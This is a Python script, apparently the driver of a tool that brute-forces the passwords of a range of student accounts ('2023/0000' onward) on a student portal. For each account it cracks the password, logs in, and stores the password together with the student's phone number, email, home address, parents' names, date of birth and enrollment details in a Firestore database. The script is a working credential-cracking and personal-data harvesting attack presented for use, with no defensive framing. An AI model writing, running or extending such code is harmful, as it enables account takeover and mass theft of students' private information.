import time
from modules.firestore_module import *
from modules.requests_module import *

def storeUserdataToDatabase(userid, password, time_taken):
    cookie = getSessionCookie(userid, password)
    studentDetailsHtml = getStudentDetails(cookie)
    student = parseStudentDetailsHtmlToStudent(studentDetailsHtml)

    data = {
            "password":password,
            "time_taken":time_taken,
            "studentName":student.name,
            "phone":student.contact_no,
            "email":student.email,
            "roll":student.roll_no, 
            "address":student.address,
            "fatherName":student.father_name,
            "motherName":student.mother_name,
            "dob":student.dob,
            "gender":student.gender,
            "studentId":student.student_id,
            "session":student.session,
            "enrollmentNo.":student.enrollment_no,
            "admssionDate":student.admission_date,
            "studentType":student.student_type,
            }
    addDataToFirestore(userid, data)


def main():
    startuid , stopuid = getUserRangeConfig()
    print(f"Got username range from config: {startuid}, {stopuid}")

    for i in range(startuid, stopuid):

        formatted = '{0:04}'.format(i)
        userid = "2023/" + formatted
        print("Started for user: "  + userid)

            
        try:
            if findFirestoreStudent(userid):
                print("Password already exist in database/being cracked")
            else:
                print("Password not found in database neither being cracked")

                # print("Checking user's existence...")
                # if not checkUserExistence(userid):
                #     print("User does not exist")
                # else:
                #     print("User exists")

                initStudentToFirestore(userid)

                print("Bruteforcing started for "+userid)

                start_time = time.perf_counter()
                password = bruteforceLogin(userid, 1000)
                end_time = time.perf_counter()
                elapsed_time = str(end_time - start_time)[:8] 

                print("Password found: " + password)
                storeUserdataToDatabase(userid, password, elapsed_time)
                print("Retrived userdata and stored in database")

        except Exception as e:
            print("Error: " + str(e))
            data = {
                "error":str(e),
                }
            addDataToFirestore(userid, data)



if __name__ == "__main__":
    main()


